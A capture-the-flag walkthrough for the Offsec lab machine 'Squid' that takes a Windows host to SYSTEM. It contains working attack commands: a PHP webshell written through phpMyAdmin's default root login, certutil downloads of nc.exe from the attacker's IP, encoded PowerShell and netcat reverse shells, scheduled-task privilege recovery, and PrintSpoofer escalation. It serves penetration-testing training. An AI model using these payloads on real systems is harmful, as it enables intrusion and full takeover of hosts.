---
box_name: "Squid"
author: "James Heringer"
platform: "Offsec"
date: 2025-09-29
tags: [Squid,PHP,Scheduled Task,PrintSpoofer,Windows]
difficulty: "easy"
---

# SQUID

* [SQUID](https://portal.offsec.com/machine/squid-38173/overview/details)
* Target IP = 192.168.246.189
* Tun0 IP =   192.168.45.166
## Summary Walkthrough
1. Initial Enumeration shows service running Squid Proxy on port 3128
2. Use Spose.py to enumerate open ports behind the Squid proxy to identify accessible services.
3. Enumeration through proxy identifed phpMyAdmin running on port 8080
4. Gobuster to brute-force WebApp directories, found index.php and phpmyadmin
5. On index.php page, identiifed `DOCUMENT_ROOT` via Tool -> phpinfo()  `c:/wamp/www/`
6. In browser, add new FoxyProxy for port 3128, navigate to website : (http://192.168.246.189:8080/phpmyadmin/)
7. Logged in to phpMyAdmin with default credential of `root` no password
8. Click on Databases, select any DB  Click into  SQL TAB
9. Using database SQL command in phpMyAdmin, wrote webShell.php file to www dir
10. Easy: use Curl commands to execte again webShell.php
11. Harder: browsed to WebShell.php  in browser, and issued RevShell powershell command, giving RevShell as Local Service
12. Now on Windows machine, check privs, `whoami /priv`, missing `SeImpersonateName`
13. Created scheduled task 1 to with revshell to recover some default LOCAL SERVICE privileges.
14. From new RevShell, created scheduled task 2 with revshell to recover SeImpersonatePrivilege for Local Service.
15. Validate `SeImpersonatePrivilege` is enabled in new shell with `whoami /priv`
16. Use PrintSpoofer to exploit SeImpersonatePrivilege and achieve SYSTEM-level access.
17. General idea is here : https://itm4n.github.io/localservice-privileges/
18. Print Spoofer : https://github.com/itm4n/PrintSpoofer

## Enumeration
```bash
nmap --top-ports 500 -sV -T4 -oA all-ports 192.168.246.189
Nmap scan report for localhost (192.168.246.189)
Host is up (0.032s latency).
Not shown: 496 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3128/tcp open  http-proxy    Squid http proxy 4.14
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

* Appears to be some sort of PROXY, hiding the services.
* Custom Squid Proxy scanner https://github.com/aancw/spose/blob/master/spose.py
```bash
python3 ./spose.py --target  192.168.246.189 --proxy http://192.168.246.189:3128

192.168.246.189:3306 seems OPEN
192.168.246.189:8080 seems OPEN
```

* added http://192.168.246.189:3128 to FoxyProxy
* Got admin page for Wampserver
* brute-force found a myPHPAdmin page 
```bash
gobuster dir -u http://192.168.246.189:8080 --proxy http://192.168.246.189:3128 -w /usr/share/wordlists/dirb/common.txt -t 40 -x .php,.txt,.html 
feroxbuster -u http://192.168.246.189:8080 -w /usr/share/wordlists/dirb/common.txt --proxy  http://192.168.246.189:3128 -k

/phpmyadmin           (Status: 301) [Size: 340] [--> http://192.168.246.189:8080/phpmyadmin/]
```

* Navigated to http://192.168.246.189:8080/phpmyadmin/, this is phpMyAdmin login page
* Tried default credentials of root, no password, success

* Navigate to http://192.168.246.189:8080/index.php
* Click on Tools, phpinfo()
* note the DOCUMENT_ROOT	C:/wamp/www
* Navigate to http://192.168.246.189:8080/phpmyadmin/index.php
* Logged in with default credentials root, blank password
* Databases -> MySQl -> SQL tab at top
* In query Box, `SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\shell.php"` then hit GO 
* Easy way
  * ```bash
    # Validate webshell works
    curl "http://127.0.0.1:8080/shell.php?cmd=whoami" --proxy 192.168.102.189:3128
    # Stage NC on target
    curl "http://127.0.0.1:8080/shell.php?cmd=certutil+-urlcache+-f+http://192.168.45.167/nc.exe+nc.exe" --proxy 192.168.102.189:3128
    # Connect back to our attacker
    curl "http://127.0.0.1:8080/shell.php?cmd=nc.exe+192.168.45.167+4441+-e+powershell.exe" --proxy 192.168.102.189:3128 
    ```
* Hard Way
  * `http://192.168.246.189:8080/shell.php?cmd=whoami` We are `local service`
  * https://www.revshells.com/, powershell #3, base64
  ```powershell
  http://192.168.246.189:8080/shell.php?cmd=powershell%20-%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA3ACIALAA0ADQANAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

* Stage files on windows
```powershell
# * started py listener `python3 -m http.server 80`

iwr http://192.168.45.166/printspoofer.exe -outFile printspoofer.exe
# OR
certutil -urlcache -f http://192.168.45.167/PrintSpoofer64.exe PrintSpoofer64.exe
certutil -urlcache -f http://192.168.45.167/nc.exe nc.exe
certutil -urlcache -f http://192.168.45.167/powercat.ps1 powercat.ps1
```

## [Local Service SeImpersonate Priv missing](https://itm4n.github.io/localservice-privileges/)
* If you pop a WebApp, & get a shell as `Local Service`, but are missing SeImpersonatePrivilege
* Craft a new Task Principal and scheduled task as `Local Service`  with FUll 

### Step 1
* Create a scheduled task that gives you back SOME permisssisons
```powershell
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\nc.exe 192.168.45.166 4445 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"
Start-ScheduledTask -TaskName "GrantPerm"
```

### Step 2
* Create another scheduled task that gives you back your SeImpersonate Perms
```powershell
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\nc.exe 192.168.45.166 4447 -e cmd.exe`""
Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
Start-ScheduledTask -TaskName "GrantAllPerms2"
PrintSpoofer.exe -i -c "cmd /c cmd.exe"
#  You can also use a potato for this part
SigmaPotato.exe --revshell 192.168.45.167 4445
```

##  Proof
* `C:\users\administrator\desktop> type proof.txt b0b5efa9048798a12e889af35899dd4` 
 
